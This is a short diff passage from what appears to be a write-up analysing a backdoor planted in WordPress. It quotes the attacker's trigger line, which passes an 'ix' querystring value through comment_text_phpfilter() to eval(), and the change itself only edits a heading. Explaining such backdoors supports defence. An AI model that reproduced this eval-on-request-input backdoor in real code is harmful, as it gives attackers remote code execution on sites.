@@ -33,7 +33,7 @@ eval($filterdata);
 }</blockquote>
 Several lines later, the attacker planted a mechanism to call the backdoor.  In this case, the attacker checked for the presense of the "ix" parameter being passed via the querystring.  If the "ix" querystring parameter was present, the value assigned to "ix" would be passed to "comment_text_phpfilter()", which would pass the attacker supplied value to eval().
 <blockquote>if ($_GET["ix"]) { comment_text_phpfilter($_GET["ix"]); }</blockquote>
-<h2>Developers Solution</h2>
+## Developers Solution
 [cce lang="diff"]
 
 function comment_author_rss() {
